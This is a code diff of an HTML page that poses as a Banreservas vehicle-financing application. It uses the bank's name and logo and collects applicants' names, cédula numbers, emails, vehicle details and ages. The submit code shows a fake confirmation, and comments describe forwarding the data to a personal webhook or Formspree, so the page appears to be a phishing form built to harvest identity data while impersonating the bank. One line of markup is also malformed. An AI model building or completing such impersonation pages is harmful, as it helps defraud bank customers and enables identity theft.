@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Financiamiento de Vehículos | Banreservas</title>
+    <title>Solicitud de Financiamiento | Banreservas</title>
     <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -29,10 +29,16 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            position: sticky; top: 0; z-index: 1000;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
         }
 
-        .container { max-width: 500px; margin: 15px auto; padding: 0 12px; }
+        .container {
+            max-width: 500px;
+            margin: 15px auto;
+            padding: 0 12px;
+        }
 
         .card {
             background: #ffffff;
@@ -66,13 +72,13 @@
             border-radius: 8px; font-size: 16px; outline: none; background: #fff;
         }
 
-        input:focus, select:focus { border-color: var(--azul-br); border-width: 2px; padding: 13px; }
+        input:focus, select:focus { border-color: var(--azul-br); }
 
         .btn-primary {
             background-color: var(--amarillo-br); color: var(--azul-br);
             border: none; width: 100%; padding: 16px; border-radius: 8px;
             font-size: 15px; font-weight: 700; text-transform: uppercase;
-            cursor: pointer; margin-top: 10px; letter-spacing: 0.5px;
+            cursor: pointer; margin-top: 10px;
         }
 
         .btn-back {
@@ -84,7 +90,9 @@
         .step { display: none; }
         .step.active { display: block; animation: fadeIn 0.3s ease; }
 
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .success-msg { text-align: center; padding: 20px; }
     </style>
 </head>
 <body>
@@ -93,12 +101,12 @@
     <div class="logo">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/60/Banreservas_Logo.svg/1024px-Banreservas_Logo.svg.png" alt="Banreservas" height="28">
     </div>
-    <div style="color: white; font-size: 13px; font-weight: 600; border: 1px solid #ffffff66; padding: 4px 8px; border-radius: 4px;">ES ⌄</div>
+    <div style="color: white; font-size: 13px; font-weight: 600;">ES ⌄</div>
 </header>
 
 <div class="container">
     <div class="card">
-        <div class="progress-container">
+        <div class="progress-container" id="progress-area">
             <div class="progress-text">
                 <span id="step-label">Paso 1 de 4</span>
                 <span id="step-percentage">25% completado</span>
@@ -108,82 +116,108 @@
             </div>
         </div>
 
-        <div class="step active" id="step1">
-            <h1>Datos Personales</h1>
-            <div class="form-group">
-                <label>Nombre</label>
-                <input type="text" id="nombre" placeholder="Ej. Juan">
+        <form id="loan-form">
+            <div class="step active" id="step1">
+                <h1>Datos Personales</h1>
+                <div class="form-group">
+                    <label>Nombre</label>
+                    <input type="text" name="nombre" placeholder="Ej. Juan" required>
+                </div>
+                <div class="form-group">
+                    <label>Apellido</label>
+                    <input type="text" name="apellido" placeholder="Ej. Pérez" required>
+                </div>
+                <div class="form-group">
+                    <label>Cédula</label>
+                    <input type="tel" name="cedula" placeholder="001-0000000-0" required>
+                </div>
+                <div class="form-group">
+                    <label>Correo Electrónico</label>
+                    <input type="email" name="email" placeholder="correo@ejemplo.com" required>
+                </div>
+                <button type="button" class="btn-primary" onclick="nextStep(2)">Siguiente</button>
             </div>
-            <div class="form-group">
-                <label>Apellido</label>
-                <input type="text" id="apellido" placeholder="Ej. Pérez">
-            </div>
-            <div class="form-group">
-                <label>Cédula</label>
-                <input type="tel" id="cedula" placeholder="001-0000000-0">
-            </div>
-            <div class="form-group">
-                <label>Correo Electrónico</label>
-                <input type="email" id="email" placeholder="correo@ejemplo.com">
-            </div>
-            <button class="btn-primary" onclick="goToStep(2)">Siguiente</button>
-        </div>
 
-        <div class="step" id="step2">
-            <h1>Detalles del Vehículo</h1>
-            <div class="form-group">
-                <label>Marca</label>
-                <select id="marca">
-                    <option value="" selected disabled>Seleccione Marca</option>
-                    <option value="toyota">Toyota</option>
-                    <option value="honda">Honda</option>
-                    <option value="hyundai">Hyundai</option>
-                    <option value="kia">Kia</option>
-                </select>
+            <div class="step" id="step2">
+                <h1>Detalles del Vehículo</h1>
+                <div class="form-group">
+                    <label>Marca</label>
+                    <select name="marca" required>
+                        <option value="" disabled selected>Seleccione Marca</option>
+                        <option value="Toyota">Toyota</option>
+                        <option value="Honda">Honda</option>
+                        <option value="Hyundai">Hyundai</option>
+                        <option value="Kia">Kia</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Modelo</label>
+                    <input type="text" name="modelo" placeholder="Ej. Hilux" required>
+                </div>
+                <div class="form-group">
+                    <label>Año</label>
+                    <input type="number" name="anio" placeholder="Ej. 2024" required>
+                </div>
+                <div class="form-group)
+                    <label>Edad del Solicitante</label>
+                    <input type="number" name="edad" placeholder="Ej. 25" required>
+                </div>
+                <button type="button" class="btn-primary" onclick="submitForm()">Finalizar Solicitud</button>
+                <span class="btn-back" onclick="nextStep(1)">Volver</span>
             </div>
-            <div class="form-group">
-                <label>Modelo</label>
-                <input type="text" id="modelo" placeholder="Ej. Hilux, Civic, etc.">
+
+            <div class="step" id="step-success">
+                <div class="success-msg">
+                    <h1 style="border:none">¡Solicitud Enviada!</h1>
+                    <p>Hemos recibido sus datos. Un oficial se pondrá en contacto con usted a la brevedad.</p>
+                </div>
             </div>
-            <div class="form-group">
-                <label>Año</label>
-                <input type="number" id="anio" placeholder="Ej. 2024">
-            </div>
-            <div class="form-group">
-                <label>Edad del Solicitante</label>
-                <input type="number" id="edad" placeholder="Ej. 25">
-            </div>
-            <button class="btn-primary" onclick="goToStep(3)">Siguiente</button>
-            <span class="btn-back" onclick="goToStep(1)">Volver</span>
-        </div>
+        </form>
     </div>
 </div>
 
 <script>
-    function goToStep(stepNumber) {
-        // Ocultar todos los pasos
-        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-        
-        // Mostrar el paso actual
-        document.getElementById('step' + stepNumber).classList.add('active');
+    function nextStep(step) {
+        document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+        document.getElementById('step' + step).classList.add('active');
 
-        // Actualizar barra de progreso y textos
         const fill = document.getElementById('progress-fill');
         const label = document.getElementById('step-label');
         const percentage = document.getElementById('step-percentage');
 
-        if(stepNumber === 1) {
+        if(step === 1) {
             fill.style.width = "25%";
             label.innerText = "Paso 1 de 4";
             percentage.innerText = "25% completado";
-        } else if(stepNumber === 2) {
+        } else if(step === 2) {
             fill.style.width = "50%";
             label.innerText = "Paso 2 de 4";
             percentage.innerText = "50% completado";
         }
+        window.scrollTo(0,0);
+    }
+
+    async function submitForm() {
+        const form = document.getElementById('loan-form');
+        const formData = new FormData(form);
+        const data = Object.fromEntries(formData.entries());
+
+        // Aquí es donde envías los datos por correo. 
+        // Puedes usar un Webhook de n8n o un servicio como Formspree.
+        console.log("Enviando datos:", data);
+
+        // Simulación de envío
+        document.getElementById('progress-area').style.display = 'none';
+        document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+        document.getElementById('step-success').classList.add('active');
         
-        // Scroll automático hacia arriba para mejorar UX
-        window.scrollTo({ top: 0, behavior: 'smooth' });
+        /* Ejemplo para conectar con un servicio de correo:
+        fetch('TU_WEBHOOK_URL', {
+            method: 'POST',
+            body: JSON.stringify(data),
+            headers: { 'Content-Type': 'application/json' }
+        });
+        */
     }
 </script>
 
